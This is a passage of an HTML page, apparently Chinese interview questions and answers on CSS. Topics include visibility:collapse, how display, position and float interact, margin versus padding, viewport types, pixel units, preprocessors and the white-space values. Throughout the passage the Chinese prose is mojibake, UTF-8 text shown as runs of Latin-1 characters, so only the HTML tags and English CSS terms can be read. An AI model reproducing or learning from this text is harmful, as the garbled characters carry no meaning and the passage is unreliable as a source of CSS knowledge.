æ˜¯ä¸å¯è§çš„ï¼Œä½†æ­¤æ—¶ä»å ç”¨é¡µé¢ç©ºé—´ã€‚</p><p>ï¼ˆ2ï¼‰ä½†ä¾‹å¤–çš„æ˜¯ï¼Œå¦‚æœè¿™ä¸ªå…ƒç´ æ˜¯tableç›¸å…³çš„å…ƒç´ ï¼Œä¾‹å¦‚tableè¡Œï¼Œtable groupï¼Œtableåˆ—ï¼Œtable column groupï¼Œå®ƒçš„è¡¨ç°å´è·Ÿdisplay:noneä¸€æ ·ï¼Œä¹Ÿå°±æ˜¯è¯´ï¼Œå®ƒä»¬å ç”¨çš„ç©ºé—´ä¹Ÿä¼šé‡Šæ”¾ã€‚</p><p>åœ¨ä¸åŒæµè§ˆå™¨ä¸‹çš„åŒºåˆ«ï¼š</p><ul><li><p>åœ¨è°·æ­Œæµè§ˆå™¨é‡Œï¼Œä½¿ç”¨collapseå€¼å’Œä½¿ç”¨hiddenå€¼æ²¡æœ‰ä»€ä¹ˆåŒºåˆ«ã€‚</p></li><li><p>åœ¨ç«ç‹æµè§ˆå™¨ã€Operaå’ŒIE11é‡Œï¼Œä½¿ç”¨collapseå€¼çš„æ•ˆæœå°±å¦‚å®ƒçš„å­—é¢æ„æ€ï¼štableçš„è¡Œä¼šæ¶ˆå¤±ï¼Œå®ƒçš„ä¸‹é¢ä¸€è¡Œä¼šè¡¥å……å®ƒçš„ä½ç½®ã€‚</p></li></ul><h2 id="â€˜displayâ€™ã€â€™positionâ€™å’Œâ€™floatâ€™çš„ç›¸äº’å…³ç³»ï¼Ÿ"><a href="#â€˜displayâ€™ã€â€™positionâ€™å’Œâ€™floatâ€™çš„ç›¸äº’å…³ç³»ï¼Ÿ" class="headerlink" title="â€˜displayâ€™ã€â€™positionâ€™å’Œâ€™floatâ€™çš„ç›¸äº’å…³ç³»ï¼Ÿ"></a>â€˜displayâ€™ã€â€™positionâ€™å’Œâ€™floatâ€™çš„ç›¸äº’å…³ç³»ï¼Ÿ</h2><p>ï¼ˆ1ï¼‰é¦–å…ˆæˆ‘ä»¬åˆ¤æ–­displayå±æ€§æ˜¯å¦ä¸ºnoneï¼Œå¦‚æœä¸ºnoneï¼Œåˆ™positionå’Œfloatå±æ€§çš„å€¼ä¸å½±å“å…ƒç´ æœ€åçš„è¡¨ç°ã€‚</p><p>ï¼ˆ2ï¼‰ç„¶ååˆ¤æ–­positionçš„å€¼æ˜¯å¦ä¸ºabsoluteæˆ–è€…fixedï¼Œå¦‚æœæ˜¯ï¼Œåˆ™floatå±æ€§å¤±æ•ˆï¼Œå¹¶ä¸”displayçš„å€¼åº”è¯¥è¢«è®¾ç½®ä¸ºtableæˆ–è€…blockï¼Œå…·ä½“è½¬æ¢éœ€è¦çœ‹åˆå§‹è½¬æ¢å€¼ã€‚</p><p>ï¼ˆ3ï¼‰å¦‚æœpositionçš„å€¼ä¸ä¸ºabsoluteæˆ–è€…fixedï¼Œåˆ™åˆ¤æ–­floatå±æ€§çš„å€¼æ˜¯å¦ä¸ºnoneï¼Œå¦‚æœä¸æ˜¯ï¼Œåˆ™displayçš„å€¼åˆ™æŒ‰ä¸Šé¢çš„è§„åˆ™è½¬æ¢ã€‚æ³¨æ„ï¼Œå¦‚æœpositionçš„å€¼ä¸ºrelativeå¹¶ä¸”floatå±æ€§çš„å€¼å­˜åœ¨ï¼Œåˆ™relativeç›¸å¯¹äºæµ®åŠ¨åçš„æœ€ç»ˆä½ç½®å®šä½ã€‚</p><p>ï¼ˆ4ï¼‰å¦‚æœfloatçš„å€¼ä¸ºnoneï¼Œåˆ™åˆ¤æ–­å…ƒç´ æ˜¯å¦ä¸ºæ ¹å…ƒç´ ï¼Œå¦‚æœæ˜¯æ ¹å…ƒç´ åˆ™displayå±æ€§æŒ‰ç…§ä¸Šé¢çš„è§„åˆ™è½¬æ¢ï¼Œå¦‚æœä¸æ˜¯ï¼Œåˆ™ä¿æŒæŒ‡å®šçš„displayå±æ€§å€¼ä¸å˜ã€‚</p><p>æ€»çš„æ¥è¯´ï¼Œå¯ä»¥æŠŠå®ƒçœ‹ä½œæ˜¯ä¸€ä¸ªç±»ä¼¼ä¼˜å…ˆçº§çš„æœºåˆ¶ï¼Œâ€position:absoluteâ€å’Œâ€position:fixedâ€ä¼˜å…ˆçº§æœ€é«˜ï¼Œæœ‰å®ƒå­˜åœ¨<br>çš„æ—¶å€™ï¼Œæµ®åŠ¨ä¸èµ·ä½œç”¨ï¼Œâ€™displayâ€™çš„å€¼ä¹Ÿéœ€è¦è°ƒæ•´ï¼›å…¶æ¬¡ï¼Œå…ƒç´ çš„â€™floatâ€™ç‰¹æ€§çš„å€¼ä¸æ˜¯â€noneâ€çš„æ—¶å€™æˆ–è€…å®ƒæ˜¯æ ¹å…ƒç´ <br>çš„æ—¶å€™ï¼Œè°ƒæ•´â€™displayâ€™çš„å€¼ï¼›æœ€åï¼Œéæ ¹å…ƒç´ ï¼Œå¹¶ä¸”éæµ®åŠ¨å…ƒç´ ï¼Œå¹¶ä¸”éç»å¯¹å®šä½çš„å…ƒç´ ï¼Œâ€™displayâ€™ç‰¹æ€§å€¼åŒè®¾ç½®å€¼ã€‚</p><h2 id="margin-å’Œ-padding-åˆ†åˆ«é€‚åˆä»€ä¹ˆåœºæ™¯ä½¿ç”¨ï¼Ÿ"><a href="#margin-å’Œ-padding-åˆ†åˆ«é€‚åˆä»€ä¹ˆåœºæ™¯ä½¿ç”¨ï¼Ÿ" class="headerlink" title="margin å’Œ padding åˆ†åˆ«é€‚åˆä»€ä¹ˆåœºæ™¯ä½¿ç”¨ï¼Ÿ"></a>margin å’Œ padding åˆ†åˆ«é€‚åˆä»€ä¹ˆåœºæ™¯ä½¿ç”¨ï¼Ÿ</h2><p>marginæ˜¯ç”¨æ¥éš”å¼€å…ƒç´ ä¸å…ƒç´ çš„é—´è·ï¼›paddingæ˜¯ç”¨æ¥éš”å¼€å…ƒç´ ä¸å†…å®¹çš„é—´éš”ã€‚<br>marginç”¨äºå¸ƒå±€åˆ†å¼€å…ƒç´ ä½¿å…ƒç´ ä¸å…ƒç´ äº’ä¸ç›¸å¹²ã€‚<br>paddingç”¨äºå…ƒç´ ä¸å†…å®¹ä¹‹é—´çš„é—´éš”ï¼Œè®©å†…å®¹ï¼ˆæ–‡å­—ï¼‰ä¸ï¼ˆåŒ…è£¹ï¼‰å…ƒç´ ä¹‹é—´æœ‰ä¸€æ®µè·ç¦»ã€‚</p><p>ä½•æ—¶åº”å½“ä½¿ç”¨marginï¼š</p><ul><li>éœ€è¦åœ¨borderå¤–ä¾§æ·»åŠ ç©ºç™½æ—¶ã€‚</li><li>ç©ºç™½å¤„ä¸éœ€è¦èƒŒæ™¯ï¼ˆè‰²ï¼‰æ—¶ã€‚</li><li>ä¸Šä¸‹ç›¸è¿çš„ä¸¤ä¸ªç›’å­ä¹‹é—´çš„ç©ºç™½ï¼Œéœ€è¦ç›¸äº’æŠµæ¶ˆæ—¶ã€‚å¦‚15px+20pxçš„marginï¼Œå°†å¾—åˆ°20pxçš„ç©ºç™½ã€‚</li></ul><p>ä½•æ—¶åº”å½“æ—¶ç”¨paddingï¼š</p><ul><li>éœ€è¦åœ¨borderå†…æµ‹æ·»åŠ ç©ºç™½æ—¶ã€‚</li><li>ç©ºç™½å¤„éœ€è¦èƒŒæ™¯ï¼ˆè‰²ï¼‰æ—¶ã€‚</li><li>ä¸Šä¸‹ç›¸è¿çš„ä¸¤ä¸ªç›’å­ä¹‹é—´çš„ç©ºç™½ï¼Œå¸Œæœ›ç­‰äºä¸¤è€…ä¹‹å’Œæ—¶ã€‚å¦‚15px+20pxçš„paddingï¼Œå°†å¾—åˆ°35pxçš„ç©ºç™½ã€‚</li></ul><h2 id="font-style-å±æ€§ä¸­-italic-å’Œ-oblique-çš„åŒºåˆ«ï¼Ÿ"><a href="#font-style-å±æ€§ä¸­-italic-å’Œ-oblique-çš„åŒºåˆ«ï¼Ÿ" class="headerlink" title="font-style å±æ€§ä¸­ italic å’Œ oblique çš„åŒºåˆ«ï¼Ÿ"></a>font-style å±æ€§ä¸­ italic å’Œ oblique çš„åŒºåˆ«ï¼Ÿ</h2><p>italicå’Œobliqueè¿™ä¸¤ä¸ªå…³é”®å­—éƒ½è¡¨ç¤ºâ€œæ–œä½“â€çš„æ„æ€ã€‚</p><p>å®ƒä»¬çš„åŒºåˆ«åœ¨äºï¼Œitalicæ˜¯ä½¿ç”¨å½“å‰å­—ä½“çš„æ–œä½“å­—ä½“ï¼Œè€Œobliqueåªæ˜¯å•çº¯åœ°è®©æ–‡å­—å€¾æ–œã€‚å¦‚æœå½“å‰å­—ä½“æ²¡æœ‰å¯¹åº”çš„æ–œä½“å­—ä½“ï¼Œåˆ™é€€è€Œæ±‚å…¶æ¬¡ï¼Œè§£æä¸ºobliqueï¼Œä¹Ÿå°±æ˜¯å•çº¯å½¢çŠ¶å€¾æ–œã€‚</p><h2 id="layout-viewportã€visual-viewport-å’Œ-ideal-viewport-çš„åŒºåˆ«ï¼Ÿ"><a href="#layout-viewportã€visual-viewport-å’Œ-ideal-viewport-çš„åŒºåˆ«ï¼Ÿ" class="headerlink" title="layout viewportã€visual viewport å’Œ ideal viewport çš„åŒºåˆ«ï¼Ÿ"></a>layout viewportã€visual viewport å’Œ ideal viewport çš„åŒºåˆ«ï¼Ÿ</h2><p>å¦‚æœæŠŠç§»åŠ¨è®¾å¤‡ä¸Šæµè§ˆå™¨çš„å¯è§†åŒºåŸŸè®¾ä¸ºviewportçš„è¯ï¼ŒæŸäº›ç½‘ç«™å°±ä¼šå› ä¸ºviewportå¤ªçª„è€Œæ˜¾ç¤ºé”™ä¹±ï¼Œæ‰€ä»¥è¿™äº›æµè§ˆå™¨å°±å†³å®šé»˜è®¤æƒ…å†µä¸‹æŠŠviewportè®¾ä¸ºä¸€ä¸ªè¾ƒå®½çš„å€¼ï¼Œæ¯”å¦‚980pxï¼Œè¿™æ ·çš„è¯å³ä½¿æ˜¯é‚£äº›ä¸ºæ¡Œé¢è®¾è®¡çš„ç½‘ç«™ä¹Ÿèƒ½åœ¨ç§»åŠ¨æµè§ˆå™¨ä¸Šæ­£å¸¸æ˜¾ç¤ºäº†ã€‚ppkæŠŠè¿™ä¸ªæµè§ˆå™¨é»˜è®¤çš„viewportå«åšlayout viewportã€‚</p><p>layout viewportçš„å®½åº¦æ˜¯å¤§äºæµè§ˆå™¨å¯è§†åŒºåŸŸçš„å®½åº¦çš„ï¼Œæ‰€ä»¥æˆ‘ä»¬è¿˜éœ€è¦ä¸€ä¸ªviewportæ¥ä»£è¡¨æµè§ˆå™¨å¯è§†åŒºåŸŸçš„å¤§å°ï¼ŒppkæŠŠè¿™ä¸ªviewportå«åšvisual viewportã€‚</p><p>ideal viewportæ˜¯æœ€é€‚åˆç§»åŠ¨è®¾å¤‡çš„viewportï¼Œideal viewportçš„å®½åº¦ç­‰äºç§»åŠ¨è®¾å¤‡çš„å±å¹•å®½åº¦ï¼Œåªè¦åœ¨cssä¸­æŠŠæŸä¸€å…ƒç´ çš„å®½åº¦è®¾ä¸ºideal viewportçš„å®½åº¦ï¼ˆå•ä½ç”¨pxï¼‰ï¼Œé‚£ä¹ˆè¿™ä¸ªå…ƒç´ çš„å®½åº¦å°±æ˜¯è®¾å¤‡å±å¹•çš„å®½åº¦äº†ï¼Œä¹Ÿå°±æ˜¯å®½åº¦ä¸º100%çš„æ•ˆæœã€‚ideal viewportçš„æ„ä¹‰åœ¨äºï¼Œæ— è®ºåœ¨ä½•ç§åˆ†è¾¨ç‡çš„å±å¹•ä¸‹ï¼Œé‚£äº›é’ˆå¯¹ideal viewportè€Œè®¾è®¡çš„ç½‘ç«™ï¼Œä¸éœ€è¦ç”¨æˆ·æ‰‹åŠ¨ç¼©æ”¾ï¼Œä¹Ÿä¸éœ€è¦å‡ºç°æ¨ªå‘æ»šåŠ¨æ¡ï¼Œéƒ½å¯ä»¥å®Œç¾çš„å‘ˆç°ç»™ç”¨æˆ·ã€‚</p><p><strong>å›ç­”ï¼š</strong></p><p>ç§»åŠ¨ç«¯ä¸€å…±éœ€è¦ç†è§£ä¸‰ä¸ªviewportçš„æ¦‚å¿µçš„ç†è§£ã€‚</p><ul><li><p>ç¬¬ä¸€ä¸ªè§†å£æ˜¯å¸ƒå±€è§†å£ï¼Œåœ¨ç§»åŠ¨ç«¯æ˜¾ç¤ºç½‘é¡µæ—¶ï¼Œç”±äºç§»åŠ¨ç«¯çš„å±å¹•å°ºå¯¸æ¯”è¾ƒå°ï¼Œå¦‚æœç½‘é¡µä½¿ç”¨ç§»åŠ¨ç«¯çš„å±å¹•å°ºå¯¸è¿›è¡Œå¸ƒå±€çš„è¯ï¼Œé‚£ä¹ˆæ•´ä¸ªé¡µé¢çš„å¸ƒå±€éƒ½ä¼šæ˜¾ç¤ºé”™ä¹±ã€‚æ‰€ä»¥ç§»åŠ¨ç«¯æµè§ˆå™¨æä¾›äº†ä¸€ä¸ªlayout viewportå¸ƒå±€è§†å£çš„æ¦‚å¿µï¼Œä½¿ç”¨è¿™ä¸ªè§†å£æ¥å¯¹é¡µé¢è¿›è¡Œå¸ƒå±€å±•ç¤ºï¼Œä¸€èˆ¬layout viewportçš„å¤§å°ä¸º980pxï¼Œå› æ­¤é¡µé¢å¸ƒå±€ä¸ä¼šæœ‰å¤ªå¤§çš„å˜åŒ–ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡æ‹–åŠ¨å’Œç¼©æ”¾æ¥æŸ¥çœ‹åˆ°è¿™ä¸ªé¡µé¢ã€‚</p></li><li><p>ç¬¬äºŒä¸ªè§†å£æŒ‡çš„æ˜¯è§†è§‰è§†å£ï¼Œvisual viewportæŒ‡çš„æ˜¯ç§»åŠ¨è®¾å¤‡ä¸Šæˆ‘ä»¬å¯è§çš„åŒºåŸŸçš„è§†å£å¤§å°ï¼Œä¸€èˆ¬ä¸ºå±å¹•çš„åˆ†è¾¨ç‡çš„å¤§å°ã€‚visual viewportå’Œlayout viewportçš„å…³ç³»ï¼Œå°±åƒæ˜¯æˆ‘ä»¬é€šè¿‡çª—æˆ·çœ‹å¤–é¢çš„é£æ™¯ï¼Œè§†è§‰è§†å£å°±æ˜¯çª—æˆ·ï¼Œè€Œå¤–é¢çš„é£æ™¯å°±æ˜¯å¸ƒå±€è§†å£ä¸­çš„ç½‘é¡µå†…å®¹ã€‚</p></li><li><p>ç¬¬ä¸‰ä¸ªè§†å£æ˜¯ç†æƒ³è§†å£ï¼Œç”±äºlayout viewportä¸€èˆ¬æ¯”visual viewportè¦å¤§ï¼Œæ‰€ä»¥æƒ³è¦çœ‹åˆ°æ•´ä¸ªé¡µé¢å¿…é¡»é€šè¿‡æ‹–åŠ¨å’Œç¼©æ”¾æ‰èƒ½å®ç°ã€‚æ‰€ä»¥åˆæå‡ºäº†ideal viewportçš„æ¦‚å¿µï¼Œideal viewportä¸‹ç”¨æˆ·ä¸ç”¨ç¼©æ”¾å’Œæ»šåŠ¨æ¡å°±èƒ½å¤ŸæŸ¥çœ‹åˆ°æ•´ä¸ªé¡µé¢ï¼Œå¹¶ä¸”é¡µé¢åœ¨ä¸åŒåˆ†è¾¨ç‡ä¸‹æ˜¾ç¤ºçš„å†…å®¹å¤§å°ç›¸åŒã€‚ideal viewportå…¶å®å°±æ˜¯é€šè¿‡ä¿®æ”¹layout viewportçš„å¤§å°ï¼Œè®©å®ƒç­‰äºè®¾å¤‡çš„å®½åº¦ï¼Œè¿™ä¸ªå®½åº¦å¯ä»¥ç†è§£ä¸ºæ˜¯è®¾å¤‡ç‹¬ç«‹åƒç´ ï¼Œå› æ­¤æ ¹æ®ideal viewportè®¾è®¡çš„é¡µé¢ï¼Œåœ¨ä¸åŒåˆ†è¾¨ç‡çš„å±å¹•ä¸‹ï¼Œæ˜¾ç¤ºåº”è¯¥ç›¸åŒã€‚</p></li></ul><h2 id="è®¾å¤‡åƒç´ ã€css-åƒç´ ã€è®¾å¤‡ç‹¬ç«‹åƒç´ ã€dprã€ppi-ä¹‹é—´çš„åŒºåˆ«ï¼Ÿ"><a href="#è®¾å¤‡åƒç´ ã€css-åƒç´ ã€è®¾å¤‡ç‹¬ç«‹åƒç´ ã€dprã€ppi-ä¹‹é—´çš„åŒºåˆ«ï¼Ÿ" class="headerlink" title="è®¾å¤‡åƒç´ ã€css åƒç´ ã€è®¾å¤‡ç‹¬ç«‹åƒç´ ã€dprã€ppi ä¹‹é—´çš„åŒºåˆ«ï¼Ÿ"></a>è®¾å¤‡åƒç´ ã€css åƒç´ ã€è®¾å¤‡ç‹¬ç«‹åƒç´ ã€dprã€ppi ä¹‹é—´çš„åŒºåˆ«ï¼Ÿ</h2><p>è®¾å¤‡åƒç´ æŒ‡çš„æ˜¯ç‰©ç†åƒç´ ï¼Œä¸€èˆ¬æ‰‹æœºçš„åˆ†è¾¨ç‡æŒ‡çš„å°±æ˜¯è®¾å¤‡åƒç´ ï¼Œä¸€ä¸ªè®¾å¤‡çš„è®¾å¤‡åƒç´ æ˜¯ä¸å¯å˜çš„ã€‚</p><p>cssåƒç´ å’Œè®¾å¤‡ç‹¬ç«‹åƒç´ æ˜¯ç­‰ä»·çš„ï¼Œä¸ç®¡åœ¨ä½•ç§åˆ†è¾¨ç‡çš„è®¾å¤‡ä¸Šï¼Œcssåƒç´ çš„å¤§å°åº”è¯¥æ˜¯ä¸€è‡´çš„ï¼Œcssåƒç´ æ˜¯ä¸€ä¸ªç›¸å¯¹å•ä½ï¼Œå®ƒæ˜¯ç›¸å¯¹äºè®¾å¤‡åƒç´ çš„ï¼Œä¸€ä¸ªcssåƒç´ çš„å¤§å°å–å†³äºé¡µé¢ç¼©æ”¾ç¨‹åº¦å’Œdprçš„å¤§å°ã€‚</p><p>dpræŒ‡çš„æ˜¯è®¾å¤‡åƒç´ å’Œè®¾å¤‡ç‹¬ç«‹åƒç´ çš„æ¯”å€¼ï¼Œä¸€èˆ¬çš„pcå±å¹•ï¼Œdpr=1ã€‚åœ¨iphone4æ—¶ï¼Œè‹¹æœæ¨å‡ºäº†retinaå±å¹•ï¼Œå®ƒçš„dprä¸º2ã€‚å±å¹•çš„ç¼©æ”¾ä¼šæ”¹å˜dprçš„å€¼ã€‚</p><p>ppiæŒ‡çš„æ˜¯æ¯è‹±å¯¸çš„ç‰©ç†åƒç´ çš„å¯†åº¦ï¼Œppiè¶Šå¤§ï¼Œå±å¹•çš„åˆ†è¾¨ç‡è¶Šå¤§ã€‚</p><h2 id="style-æ ‡ç­¾å†™åœ¨-body-åä¸-body-å‰æœ‰ä»€ä¹ˆåŒºåˆ«ï¼Ÿ"><a href="#style-æ ‡ç­¾å†™åœ¨-body-åä¸-body-å‰æœ‰ä»€ä¹ˆåŒºåˆ«ï¼Ÿ" class="headerlink" title="style æ ‡ç­¾å†™åœ¨ body åä¸ body å‰æœ‰ä»€ä¹ˆåŒºåˆ«ï¼Ÿ"></a>style æ ‡ç­¾å†™åœ¨ body åä¸ body å‰æœ‰ä»€ä¹ˆåŒºåˆ«ï¼Ÿ</h2><p>é¡µé¢åŠ è½½è‡ªä¸Šè€Œä¸‹å½“ç„¶æ˜¯å…ˆåŠ è½½æ ·å¼ã€‚å†™åœ¨bodyæ ‡ç­¾åç”±äºæµè§ˆå™¨ä»¥é€è¡Œæ–¹å¼å¯¹HTMLæ–‡æ¡£è¿›è¡Œè§£æï¼Œå½“è§£æåˆ°å†™åœ¨å°¾éƒ¨çš„æ ·å¼è¡¨ï¼ˆå¤–è”æˆ–å†™åœ¨styleæ ‡ç­¾ï¼‰ä¼šå¯¼è‡´æµè§ˆå™¨åœæ­¢ä¹‹å‰çš„æ¸²æŸ“ï¼Œç­‰å¾…åŠ è½½ä¸”è§£ææ ·å¼è¡¨å®Œæˆä¹‹åé‡æ–°æ¸²æŸ“ï¼Œåœ¨windowsçš„IEä¸‹å¯èƒ½ä¼šå‡ºç°FOUCç°è±¡ï¼ˆå³æ ·å¼å¤±æ•ˆå¯¼è‡´çš„é¡µé¢é—ªçƒé—®é¢˜ï¼‰</p><h2 id="CSSé¢„å¤„ç†å™¨-åå¤„ç†å™¨æ˜¯ä»€ä¹ˆï¼Ÿä¸ºä»€ä¹ˆè¦ä½¿ç”¨å®ƒä»¬ï¼Ÿ"><a href="#CSSé¢„å¤„ç†å™¨-åå¤„ç†å™¨æ˜¯ä»€ä¹ˆï¼Ÿä¸ºä»€ä¹ˆè¦ä½¿ç”¨å®ƒä»¬ï¼Ÿ" class="headerlink" title="CSSé¢„å¤„ç†å™¨/åå¤„ç†å™¨æ˜¯ä»€ä¹ˆï¼Ÿä¸ºä»€ä¹ˆè¦ä½¿ç”¨å®ƒä»¬ï¼Ÿ"></a>CSSé¢„å¤„ç†å™¨/åå¤„ç†å™¨æ˜¯ä»€ä¹ˆï¼Ÿä¸ºä»€ä¹ˆè¦ä½¿ç”¨å®ƒä»¬ï¼Ÿ</h2><p>é¢„å¤„ç†å™¨ï¼Œå¦‚ï¼š<code>less</code>ï¼Œ<code>sass</code>ï¼Œ<code>stylus</code>,ç”¨æ¥é¢„ç¼–è¯‘<code>sass</code>æˆ–è€…<code>less</code>ï¼Œå¢åŠ äº†<code>css</code>ä»£ç çš„å¤ç”¨æ€§ï¼Œè¿˜æœ‰å±‚çº§ï¼Œ<code>mixin</code>ï¼Œ å˜é‡ï¼Œå¾ªç¯ï¼Œ å‡½æ•°ç­‰ï¼Œå…·æœ‰å¾ˆæ–¹ä¾¿çš„UIç»„ä»¶æ¨¡å—åŒ–å¼€å‘èƒ½åŠ›ï¼Œæå¤§çš„æé«˜å·¥ä½œæ•ˆç‡ã€‚</p><p>åå¤„ç†å™¨ï¼Œå¯¹CSSè¿›è¡Œå¤„ç†ï¼Œå¹¶æœ€ç»ˆç”ŸæˆCSSçš„é¢„å¤„ç†å™¨ã€‚ å¦‚ï¼š <code>postCss</code>,é€šå¸¸è¢«è§†ä¸ºåœ¨å®Œæˆçš„æ ·å¼è¡¨ä¸­æ ¹æ®<code>css</code>è§„èŒƒå¤„ç†<code>css</code>ï¼Œè®©å…¶æ›´åŠ æœ‰æ•ˆã€‚ç›®å‰æœ€å¸¸åšçš„æ˜¯ç»™<code>css</code>å±æ€§æ·»åŠ æµè§ˆå™¨ç§æœ‰å‰ç¼€ï¼Œå®ç°è·¨æµè§ˆå™¨å…¼å®¹æ€§çš„é—®é¢˜ã€‚</p><p><code>css</code>é¢„å¤„ç†å™¨ä¸º<code>css</code>å¢åŠ ä¸€äº›ç¼–ç¨‹ç‰¹æ€§ï¼Œæ— éœ€è€ƒè™‘æµè§ˆå™¨çš„å…¼å®¹é—®é¢˜ï¼Œæˆ‘ä»¬å¯ä»¥åœ¨<code>CSS</code>ä¸­ä½¿ç”¨å˜é‡ï¼Œç®€å•çš„é€»è¾‘ç¨‹åºï¼Œå‡½æ•°ç­‰åœ¨ç¼–ç¨‹è¯­è¨€ä¸­çš„ä¸€äº›åŸºæœ¬çš„æ€§èƒ½ï¼Œå¯ä»¥è®©æˆ‘ä»¬çš„<code>css</code>æ›´åŠ çš„ç®€æ´ï¼Œå¢åŠ é€‚åº”æ€§ä»¥åŠå¯è¯»æ€§ï¼Œå¯ç»´æŠ¤æ€§ç­‰ã€‚</p><h2 id="letter-spacing-ä¸å­—ç¬¦é—´è·ï¼Ÿ"><a href="#letter-spacing-ä¸å­—ç¬¦é—´è·ï¼Ÿ" class="headerlink" title="letter-spacing ä¸å­—ç¬¦é—´è·ï¼Ÿ"></a>letter-spacing ä¸å­—ç¬¦é—´è·ï¼Ÿ</h2><p>letter-spacingå¯ä»¥ç”¨æ¥æ§åˆ¶å­—ç¬¦ä¹‹é—´çš„é—´è·ï¼Œè¿™é‡Œè¯´çš„â€œå­—ç¬¦â€åŒ…æ‹¬è‹±æ–‡å­—æ¯ã€æ±‰å­—ä»¥åŠç©ºæ ¼ç­‰ã€‚</p><p>letter-spacingå…·æœ‰ä»¥ä¸‹ä¸€äº›ç‰¹æ€§ã€‚</p><p>ï¼ˆ1ï¼‰ç»§æ‰¿æ€§ã€‚<br>ï¼ˆ2ï¼‰é»˜è®¤å€¼æ˜¯normalè€Œä¸æ˜¯0ã€‚è™½ç„¶è¯´æ­£å¸¸æƒ…å†µä¸‹ï¼Œnormalçš„è®¡ç®—å€¼å°±æ˜¯0ï¼Œä½†ä¸¤è€…è¿˜æ˜¯æœ‰å·®åˆ«çš„ï¼Œåœ¨æœ‰äº›åœºæ™¯ä¸‹ï¼Œletter-spacingä¼šè°ƒæ•´normalçš„è®¡ç®—å€¼ä»¥å®ç°æ›´å¥½çš„ç‰ˆé¢å¸ƒå±€ã€‚<br>ï¼ˆ3ï¼‰æ”¯æŒè´Ÿå€¼ï¼Œä¸”å€¼è¶³å¤Ÿå¤§çš„æ—¶å€™ï¼Œä¼šè®©å­—ç¬¦å½¢æˆé‡å ï¼Œç”šè‡³åå‘æ’åˆ—ã€‚<br>ï¼ˆ4ï¼‰å’Œtext-indentå±æ€§ä¸€æ ·ï¼Œæ— è®ºå€¼å¤šå¤§æˆ–å¤šå°ï¼Œç¬¬ä¸€è¡Œä¸€å®šä¼šä¿ç•™è‡³å°‘ä¸€ä¸ªå­—ç¬¦ã€‚<br>ï¼ˆ5ï¼‰æ”¯æŒå°æ•°å€¼ï¼Œå³ä½¿0.1pxä¹Ÿæ˜¯æ”¯æŒçš„ã€‚<br>ï¼ˆ6ï¼‰æš‚ä¸æ”¯æŒç™¾åˆ†æ¯”å€¼ã€‚</p><h2 id="word-spacing-ä¸å•è¯é—´è·ï¼Ÿ"><a href="#word-spacing-ä¸å•è¯é—´è·ï¼Ÿ" class="headerlink" title="word-spacing ä¸å•è¯é—´è·ï¼Ÿ"></a>word-spacing ä¸å•è¯é—´è·ï¼Ÿ</h2><p>letter-spacingä½œç”¨äºæ‰€æœ‰å­—ç¬¦ï¼Œä½†word-spacingä»…ä½œç”¨äºç©ºæ ¼å­—ç¬¦ã€‚æ¢å¥è¯è¯´ï¼Œword-spacingçš„ä½œç”¨å°±æ˜¯å¢åŠ ç©ºæ ¼çš„é—´éš™å®½åº¦ã€‚</p><h2 id="white-space-ä¸æ¢è¡Œå’Œç©ºæ ¼çš„æ§åˆ¶ï¼Ÿ"><a href="#white-space-ä¸æ¢è¡Œå’Œç©ºæ ¼çš„æ§åˆ¶ï¼Ÿ" class="headerlink" title="white-space ä¸æ¢è¡Œå’Œç©ºæ ¼çš„æ§åˆ¶ï¼Ÿ"></a>white-space ä¸æ¢è¡Œå’Œç©ºæ ¼çš„æ§åˆ¶ï¼Ÿ</h2><p>white-spaceå±æ€§å£°æ˜äº†å¦‚ä½•å¤„ç†å…ƒç´ å†…çš„ç©ºç™½å­—ç¬¦ï¼Œè¿™ç±»ç©ºç™½å­—ç¬¦åŒ…æ‹¬Spaceï¼ˆç©ºæ ¼ï¼‰é”®ã€Enterï¼ˆå›è½¦ï¼‰é”®ã€Tabï¼ˆåˆ¶è¡¨ç¬¦ï¼‰é”®äº§ç”Ÿçš„ç©ºç™½ã€‚å› æ­¤ï¼Œwhite-spaceå¯ä»¥å†³å®šå›¾æ–‡å†…å®¹æ˜¯å¦åœ¨ä¸€è¡Œæ˜¾ç¤ºï¼ˆå›è½¦ç©ºæ ¼æ˜¯å¦ç”Ÿæ•ˆï¼‰ï¼Œæ˜¯å¦æ˜¾ç¤ºå¤§æ®µè¿ç»­ç©ºç™½ï¼ˆç©ºæ ¼æ˜¯å¦ç”Ÿæ•ˆï¼‰ç­‰ã€‚</p><p>å…¶å±æ€§å€¼åŒ…æ‹¬ä¸‹é¢è¿™äº›ã€‚</p><ul><li>â€¢normalï¼šåˆå¹¶ç©ºç™½å­—ç¬¦å’Œæ¢è¡Œç¬¦ã€‚</li><li>preï¼šç©ºç™½å­—ç¬¦ä¸åˆå¹¶ï¼Œå¹¶ä¸”å†…å®¹åªåœ¨æœ‰æ¢è¡Œç¬¦çš„åœ°æ–¹æ¢è¡Œã€‚</li><li>nowrapï¼šè¯¥å€¼å’Œnormalä¸€æ ·ä¼šåˆå¹¶ç©ºç™½å­—ç¬¦ï¼Œä½†ä¸å…è®¸æ–‡æœ¬ç¯ç»•ã€‚</li><li>pre-wrapï¼šç©ºç™½å­—ç¬¦ä¸åˆå¹¶ï¼Œå¹¶ä¸”å†…å®¹åªåœ¨æœ‰æ¢è¡Œç¬¦çš„åœ°æ–¹æ¢è¡Œï¼ŒåŒæ—¶å…è®¸æ–‡æœ¬ç¯ç»•ã€‚</li><li>pre-lineï¼šåˆå¹¶ç©ºç™½å­—ç¬¦ï¼Œä½†åªåœ¨æœ‰æ¢è¡Œç¬¦çš„åœ°æ–¹æ¢è¡Œï¼Œå…è®¸æ–‡æœ¬ç¯ç»•ã€‚</li></ul><h2 id="absolute-ä¸-overflow-çš„å…³ç³»ï¼Ÿ"><a href="#absolute-ä¸-overflow-çš„å…³ç³»ï¼Ÿ" class="headerlink" title="absolute ä¸ overflow çš„å…³ç³»ï¼Ÿ"></a>absolute ä¸ overflow çš„å…³ç³»ï¼Ÿ</h2><p>ï¼ˆ1ï¼‰å¦‚æœoverflowä¸æ˜¯å®šä½å…ƒç´ ï¼ŒåŒæ—¶ç»å¯¹å®šä½å…ƒç´ å’Œoverflowå®¹å™¨ä¹‹é—´ä¹Ÿæ²¡æœ‰å®šä½å…ƒç´ ï¼Œåˆ™overflowæ— æ³•å¯¹absoluteå…ƒç´ è¿›è¡Œå‰ªè£ã€‚</p><p>ï¼ˆ2ï¼‰å¦‚æœoverflowçš„å±æ€§å€¼ä¸æ˜¯hiddenè€Œæ˜¯autoæˆ–è€…scrollï¼Œå³ä½¿ç»å¯¹å®šä½å…ƒç´ 